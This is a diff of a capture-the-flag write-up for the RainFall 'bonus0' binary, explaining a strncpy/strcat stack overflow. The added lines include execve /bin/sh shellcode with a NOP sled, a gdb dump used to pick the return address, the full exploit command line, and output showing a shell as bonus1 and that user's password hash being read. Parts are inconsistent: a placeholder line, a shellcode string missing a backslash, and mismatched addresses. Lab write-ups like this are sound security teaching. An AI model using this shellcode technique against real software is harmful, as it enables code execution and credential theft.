@@ -76,7 +76,7 @@ the program first calls function `pp`, and from function `pp` it calles `p` func
 
 From function `p`, it frist prints prints `" - "` on screen, and gets input with buffer size of 0x1000 from stdin. Once it copies into the buffer, if the buffer contains `newline; nl; '\n'`, it will set value where `\n` was placed into 0(=NULL; \0) and copies back 20 bytes back into first parameter of function.
 
-by checking the output, the two buffers are stored next to each other. As the strncpy() is call to copy the first 20 bytes, but on the man page,
+by checking the output, the two buffers are stored next to each other. The strncpy() is call to copy the first 20 bytes. but on the man page,
 
 ```
  If stpncpy() does not terminate dst with a
@@ -84,9 +84,83 @@ by checking the output, the two buffers are stored next to each other. As the st
      does not necessarily refer to a valid memory location.)
 ```
 
-And as the buffer is next to each other, `strcat()` function will consider the second string as the part of the first string.
+And as the buffer is next to each other, `strcat()` function will consider the second string as the part of the first string, since there is no `'\0'` is located in the first part of the buffer.
 
-We inject 4095 random caracters followed by a \n (because there is an unchecked strchr using it later). Then we will inject an overflow pattern to find where the RET address is replaced.
+XXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
 
--------------xxxxxxxxxxxxxxxxxxx----------------------
+Now we build the payload.
+
+the first argument will consist with NOP instruction greater than 61 bytes and less than the buffer.
+
+```
+NOP * 100 + [shellcode]
+"\x90" * 100 + "x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+```
+
+then find the `buffer` address for beginning of buffer address + 61 and end of the NOP instruction
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x4
+EBX: 0xb7fd0ff4 --> 0x1a4d7c
+ECX: 0xffffffff
+EDX: 0xb7fd28b8 --> 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff648 --> 0xbffff6a8 --> 0xbffff6f8 --> 0x0        <- beginning of the buffer
+ESP: 0xbfffe630 --> 0x80486a0 --> 0x202d20 (' - ')
+EIP: 0x80484d0 (<p+28>:	lea    eax,[ebp-0x1008])
+EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80484c0 <p+12>:	mov    DWORD PTR [esp],eax
+   0x80484c3 <p+15>:	call   0x80483b0 <puts@plt>
+   0x80484c8 <p+20>:	mov    DWORD PTR [esp+0x8],0x1000
+=> 0x80484d0 <p+28>:	lea    eax,[ebp-0x1008]
+   0x80484d6 <p+34>:	mov    DWORD PTR [esp+0x4],eax
+   0x80484da <p+38>:	mov    DWORD PTR [esp],0x0
+   0x80484e1 <p+45>:	call   0x8048380 <read@plt>
+   0x80484e6 <p+50>:	mov    DWORD PTR [esp+0x4],0xa
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffe630 --> 0x80486a0 --> 0x202d20 (' - ')
+0004| 0xbfffe634 --> 0x0
+0008| 0xbfffe638 --> 0x1000
+0012| 0xbfffe63c --> 0x0
+0016| 0xbfffe640 --> 0x0
+0020| 0xbfffe644 --> 0x0
+0024| 0xbfffe648 --> 0x0
+0028| 0xbfffe64c --> 0x0
+[------------------------------------------------------------------------------]
+```
+
+```
+Choose an address between 0xbfffe640 + 61 (0xbfffe67d) and 0xbfffe640 + 100 (0xbfffe6a4) => 0xbfffe640 (\xd0\xe6\xff\xbf)
+```
+
+the exploit will be following
+
+```
+python -c 'print "\x90" * 100 + "x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
+```
+```
+python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'
+```
+
+```
+(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
+```
+
+```
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
+ -
+ -
+��������������������AAAAAAAAA����BBBBBBB�� AAAAAAAAA����BBBBBBB��
+ls
+ls: cannot open directory .: Permission denied
+cat /home/users/bonus1/.pass
+cat: /home/users/bonus1/.pass: No such file or directory
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
